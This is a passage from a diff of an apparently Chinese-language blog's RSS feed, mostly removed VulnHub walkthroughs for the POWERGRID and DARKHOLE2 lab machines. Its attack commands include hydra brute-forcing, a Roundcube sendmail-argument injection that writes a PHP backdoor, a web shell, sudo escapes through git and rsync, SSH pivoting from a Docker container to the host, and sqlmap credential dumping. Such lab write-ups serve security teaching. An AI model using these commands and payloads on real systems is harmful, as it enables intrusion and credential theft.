+&lt;p&gt;判断一下这个密码属于哪个用户，发现就是 root 用户的&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1469.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
  ]]></description>
         </item>
         <item>
@@ -1200,457 +1651,6 @@ socat -d -d file: &lt;code&gt;tty&lt;/code&gt; ,raw,echo=0 TCP-LISTEN:8080&lt;/p
 &lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在gtfobins上找到了提权方法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo git help config&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;!/bin/bash&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1517.png&#34; width=&#34;310&#34; alt=&#34;Image&#34;&gt;
 &lt;p&gt;-&amp;gt; 成功拿到了 root 的 shell&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/150%20POWERGRID/</guid>
-            <title>VULNHUB 50 POWERGRID</title>
-            <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/150%20POWERGRID/</link>
-            <category>VULNHUB 41-50</category>
-            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcG93ZXJncmlkLTEwMSw0ODUv&#34;&gt;https://www.vulnhub.com/entry/powergrid-101,485/&lt;/span&gt;&lt;br&gt;
- 教程链接地址 1: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pvbmFoX0JhcmUvYXJ0aWNsZS9kZXRhaWxzLzEwNjk2MTQ3Nw==&#34;&gt;https://blog.csdn.net/Jonah_Bare/article/details/106961477&lt;/span&gt;&lt;br&gt;
- 教程链接地址 2: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmluL3Bvd2VyZ3JpZC0xLTAtMS12dWxuaHViLXdhbGt0aHJvdWdoLw==&#34;&gt;https://www.hackingarticles.in/powergrid-1-0-1-vulnhub-walkthrough/&lt;/span&gt;&lt;/p&gt;
-&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
-&lt;p&gt;攻击机 KALI： 192.168.0.135 (由于设置成了 DHCP、可能多变)&lt;br&gt;
- 靶机 POWERGRID：桥接于 192.168.0.1 的网卡，ip 未知&lt;/p&gt;
-&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
-由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip&lt;br&gt;
- &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | uniq&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1554.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;&lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | xargs sudo nmap -PA&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1555.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;&lt;code&gt;sudo nmap -sVC -T4 -Pn --open -p- 192.168.0.1 90 --min-rate=5000&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1556.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
-&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xOTAv&#34;&gt;http://192.168.0.190/&lt;/span&gt; 进行信息收集&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1557.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;收集到了三个用户名 deez 1 、p48 和 all 2&lt;/p&gt;
-&lt;p&gt;用 common.txt 字典扫了一波，没有扫到有价值的信息&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1558.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;换了个字典扫了一波，扫到了一个 zmail 的目录&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1559.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;访问之后得到了一个登陆页面&lt;/p&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xOTAvem1haWw=&#34;&gt;http://192.168.0.190/zmail&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1560.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;由于已经有了三个用户名了，是有机会爆破得到密码的&lt;/p&gt;
-&lt;h3 id=&#34;hydra爆破http-get&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra爆破http-get&#34;&gt;#&lt;/a&gt; hydra 爆破 http-get&lt;/h3&gt;
-&lt;p&gt;选择模式为 http-get，选取密码为 rockyou.txt 开始爆破&lt;br&gt;
- &lt;code&gt;hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.0.190 -f http-get /zmail/ -t 64 -f -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1561.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;第一个用户爆破了 18 万次了还是没有爆破成功，等的有点着急，让这个继续爆破下起，同时在启一个 terminal 跑另外一个爆破选择第二个用户&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1562.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;&lt;code&gt;hydra -l p48 -P /usr/share/wordlists/rockyou.txt 192.168.0.190 - f http-get /zmail/ -t 64 -f -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1563.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;在爆破到 12 万次的时候，得到了 p48 的密码 electrico&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1564.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;一个后台登陆地址，再次用 p48:electrico 登陆到其中成功&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1565.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;登陆成功，得到一个邮箱的后台界面&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1566.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;roundcube-邮件系统&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#roundcube-邮件系统&#34;&gt;#&lt;/a&gt; roundcube 邮件系统&lt;/h3&gt;
-&lt;p&gt;有一封邮件，看起来比较重要，看一下什么意思&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1567.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;就是有一个 gpg 加密后的 ssh 私钥文件，解开此私钥文件即可登陆 p 48&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1568.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;找了一圈没有找到 roundcude 的版本，直接用 searchsploit 搜索一波&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1569.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;将此 RCE 漏洞说明文件复制到本地，开始阅读，尝试测试能否突破&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1570.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
-&lt;blockquote&gt;
-&lt;p&gt;阅读后发现需要将 from 改为 example@example.com -OQueueDirectory=/tmp -X/var/www/html/rce.php，从_subject 参数中获取到 rce.php 脚本的内容&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1571.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;在后台中开是发送邮件，并且把数据拦截到 burp, 利用 burp 抓包，可以看到原始数据包有很多参数&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1572.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;blockquote&gt;
-&lt;p&gt;伪造参数内容如下，其中 token 需要和自己抓到的数据的 token 一致&lt;br&gt;
-&lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOl90b2tlbj1rcnBKOWhMSGFic1lFQUdzUzk4aXBJVkxSQmZ3SFh3VSZhbXA7X3Rhc2s9bWFpbCZhbXA7X2FjdGlvbj1zZW5kJmFtcDtfaWQ9MTEzMTU0ODgwMDYyZjcwYzVhOTBlMTYmYW1wO19hdHRhY2htZW50cz0mYW1wO19mcm9tPWV4YW1wbGVAZXhhbXBsZS5jb20=&#34;&gt;_token=krpJ9hLHabsYEAGsS98ipIVLRBfwHXwU&amp;amp;_task=mail&amp;amp;_action=send&amp;amp;_id=113154880062f70c5a90e16&amp;amp;_attachments=&amp;amp;_from=example@example.com&lt;/span&gt; -OQueueDirectory=/tmp -X/var/www/html/rce.php&amp;amp;_to=sssssss%&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzQwcXEuY29t&#34;&gt;40qq.com&lt;/span&gt;&amp;amp;_cc=&amp;amp;_bcc=&amp;amp;_replyto=&amp;amp;_followupto=&amp;amp;_subject=&lt;?php phpinfo();?&gt;&amp;amp;editorSelector=plain&amp;amp;_priority=0&amp;amp;_store_target=Sent&amp;amp;_draft_saveid=&amp;amp;_draft=&amp;amp;_is_html=0&amp;amp;_framed=1&amp;amp;_message=aaa&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1573.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;页面访问发现没有看到 rce.php 的代码，但是不是 not found 的提示，说明我们已经成功的上传上去了一个后门&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1574.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;shell转移到antsword&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#shell转移到antsword&#34;&gt;#&lt;/a&gt; shell 转移到 antsword&lt;/h3&gt;
-&lt;p&gt;其他没有任何信息的页面应该是如下内容&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1575.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;这次直接写一个 post 的一句话后门，可用 antsword 连接&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1576.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;连接成功后门，可以继续往此后门中写入反弹 shell 的代码&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1577.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;写入 mkfifo 构造好的反弹 shell 的代码并保存&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1578.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;用 curl 执行的同时，用来监听这个端口等到接收反弹 shell&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1579.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;gpg文件解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gpg文件解密&#34;&gt;#&lt;/a&gt; gpg 文件解密&lt;/h3&gt;
-&lt;p&gt;发现有 p48 这个用户，切换后输入 electrico 即可切换成功&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1580.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;发现了一个 gpg 的私钥文件，看来就是邮件系统中提醒我们用来解开 gpg 加密后的 ssh 密钥的一个密匙&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1581.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;有一个非常好的解密 gpg 的工具 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wZ3B0b29sLmdpdGh1Yi5pby8=&#34;&gt;https://pgptool.github.io/&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1582.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;下载好一个 jar 包，选取解密模块，将邮件系统中的 gpg 导入&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1583.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;提示需要一个密码，输入 p48 的密码 electrico&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1584.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;输入解密成功之后导出的文件的位置&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1585.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;解密成功得到了一个 ssh 的私钥文件&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1586.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;docker容器提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#docker容器提权&#34;&gt;#&lt;/a&gt; docker 容器提权&lt;/h3&gt;
-&lt;p&gt;没有用到在用户目录下得到的密匙文件，但是照样把这个 key 得到了，这个 key 理论上是可以登陆到 p48 用户的，但是需要注意的是，靶机上没有开放 ssh 端口，那我们应该怎么连呢&lt;/p&gt;
-&lt;p&gt;先把这个文件给 echo 到靶机上，并且改变私钥文件的权限&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1587.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
-&lt;blockquote&gt;
-&lt;p&gt;注意到当前靶机的 ip 地址中有 dokcer 网卡，既然靶机上没有开放 ssh 端口无法通过 p48 的密钥接入到 p48 用户上，那么是不是可以先用私钥文件进到一台开通了 ssh 协议的 docker 容器中呢，就试试看&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1588.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;测试一下出了 172.17.0.1 的网关地址之外，存活的 docker 主机，找到一台 172.17.0.2 是存活主机&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1589.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;&lt;code&gt;ssh p48@172.17.0.2 -i id_rsa&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1590.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;成功进入到了 docker 容器内部，用的 p 48 这个用户进去的，看 hostname 像是在 docker 容器内部，而且有 sudo 权限设置错误，可以直接调用 root 的 rsync&lt;br&gt;
- &lt;code&gt;sudo rsync -e &#39;sh -c &amp;quot;sh 0&amp;lt;&amp;amp;2 1&amp;gt;&amp;amp;2&amp;quot;&#39; 127.0.0.1:/dev/null&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1591.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;blockquote&gt;
-&lt;p&gt;提权到了 root 之后，由于我们还在 docker 内部，ip 也只有一个本地回环地址和一个 docker 虚拟出来的 ip，但是我们可以与 docker 的网关地址，即宿主机直接通信，连接到 172.17.0.1 就相当于连接到了宿主机，而我们在 docker 内部连的时候是不需要外部开通 22 端口的  &lt;code&gt;ssh root@172.17.0.1&lt;/code&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1592.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;查看 ip 地址&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1593.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 成功拿到了 root 权限，并且查看到 ip 是宿主机的 ip&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/142%20DARKHOLE2/</guid>
-            <title>VULNHUB 42 DARKHOLE2</title>
-            <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/142%20DARKHOLE2/</link>
-            <category>VULNHUB 41-50</category>
-            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZGFya2hvbGUtMiw3NDAv&#34;&gt;https://www.vulnhub.com/entry/darkhole-2,740/&lt;/span&gt;&lt;br&gt;
- 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd2RkLWJsb2cvcC8xNTIzMDgyNi5odG1s&#34;&gt;https://www.cnblogs.com/wdd-blog/p/15230826.html&lt;/span&gt;&lt;/p&gt;
-&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
-&lt;p&gt;攻击机 KALI： 192.168.31.135 (由于设置成了 DHCP、可能多变)&lt;br&gt;
- 靶机 DARKHOLE2：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
-&lt;p&gt;1) 确定靶机 ip 地址和开放的端口&lt;/p&gt;
-&lt;p&gt;由已至内网靶机所在主机 MAC 地址自动扫描靶机服务&lt;br&gt;
- &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | xargs sudo nmap -PA&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1192.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;2) 再次对其开放的端口进行详细的扫描&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;sudo nmap -A -p- 192.168.31.12 --min-rate=5000&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1193.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31. 12 、靶机开放端口 22,80&lt;/p&gt;
-&lt;p&gt;-&amp;gt; 并且扫描到了再 80 端口上是存在 git 源码泄漏的&lt;/p&gt;
-&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
-&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTI=&#34;&gt;http://192.168.31.12&lt;/span&gt; 进行信息收集&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1194.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;扫描目录  &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.12&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1195.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;依次对得到的目录信息进行访问搜索有价值的信息&lt;/p&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTIvbG9naW4ucGhw&#34;&gt;http://192.168.31.12/login.php&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1196.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTIvZGFzaGJvYXJkLnBocA==&#34;&gt;http://192.168.31.12/dashboard.php&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1197.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTIvY29uZmlnLw==&#34;&gt;http://192.168.31.12/config/&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1198.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTIvY29uZmlnL2NvbmZpZy5waHA=&#34;&gt;http://192.168.31.12/config/config.php&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1199.png&#34; width=&#34;510&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;通过对上述几个目录的信息收集，只能确定一个后台的登陆地址 login.php，和一个不被允许进入的 dashboard.php 两个信息&lt;/p&gt;
-&lt;h3 id=&#34;git源码泄漏利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#git源码泄漏利用&#34;&gt;#&lt;/a&gt; .git 源码泄漏利用&lt;/h3&gt;
-&lt;p&gt;在端口扫描阶段因为有.git 的信息，对.git 进行访问&lt;br&gt;
-&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTIvLmdpdC8=&#34;&gt; http://192.168.31.12/.git/&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1200.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;利用 githack 对源码泄漏进行利用&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1201.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;&lt;code&gt;wget https://github.com/lijiejie/GitHack/archive/refs/heads/master.zip -O Githack.zip -q;unzip -q Githack.zip;cd GitHack-master;&lt;/code&gt; &lt;br&gt;
- &lt;code&gt;python3 GitHack.py http://192.168.31.12/.git&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1202.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;通过.git 文件可以得到此项目的源码&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1203.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;源码中有 config 是敏感文件，进行读取&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1204.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;得到了数据的账户密码  &lt;code&gt;root:darkhole_2&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;但是通过 githack 的方式读取到的源码没有记录之前的 git 版本，没法使用 git 命令去获取到之前提交的版本&lt;/p&gt;
-&lt;h3 id=&#34;git-log切换git分支&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#git-log切换git分支&#34;&gt;#&lt;/a&gt; git log 切换 git 分支&lt;/h3&gt;
-&lt;p&gt;除了 githack 的利用方式之外还可以用如下方式&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;TF=$(mktemp -d); cd $TF;wget -r http://192.168.31.12/.git/ -q; cd $TF/192.168.31.12 &amp;amp;&amp;amp; git clone. webapp &amp;amp;&amp;amp; cd webapp&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1205.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;通过这种方式可以得到.git 文件，执行 git 的相关命令&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;git log&lt;/code&gt;  查看之前提交的版本，看到有一次提交信息是涉及到 login.php 的，切换到该分支查看&lt;br&gt;
- &lt;code&gt;git reset --hard a4d900a8d85e8938d3601f3cef113ee293028e10&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1206.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;在 login.php 内容中看到了用户名和密码 &lt;code&gt;lush@admin.com:321&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1207.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;sqlmap一把梭&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap一把梭&#34;&gt;#&lt;/a&gt; sqlmap 一把梭&lt;/h3&gt;
-&lt;p&gt;通过得到的用户名和密码进入到了对方后台管理中心&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1208.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;观察 url 地址 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuOTQvZGFzaGJvYXJkLnBocD9pZD0x&#34;&gt;http://192.168.31.94/dashboard.php?id=1&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;似乎是存在 sql 注入的，通过 burp 截取数据包&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1209.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;&lt;code&gt;sqlmap -r 1.txt --dbs --batch&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1210.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;跑出来了数据库的名字 darkhole_2，继续测试数据库中有哪些表&lt;br&gt;
- &lt;code&gt;sqlmap -r 1.txt --dbs --batch - D darkhole_2 --tables&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1211.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;得到两张表，选取 ssh 表去查看有哪些列&lt;br&gt;
- &lt;code&gt;sqlmap -r 1.txt --dbs --batch - D darkhole_2 -T ssh --columns&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1212.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;得到此表下的三个字段 user、id、pass&lt;br&gt;
- &lt;code&gt;sqlmap -r 1.txt --batch -D darkhole_2 -T ssh -C user,id,pass --dump&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1213.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;最终得到了数据库的用户名和密码 &lt;code&gt;jehad:fool&lt;/code&gt;&lt;/p&gt;
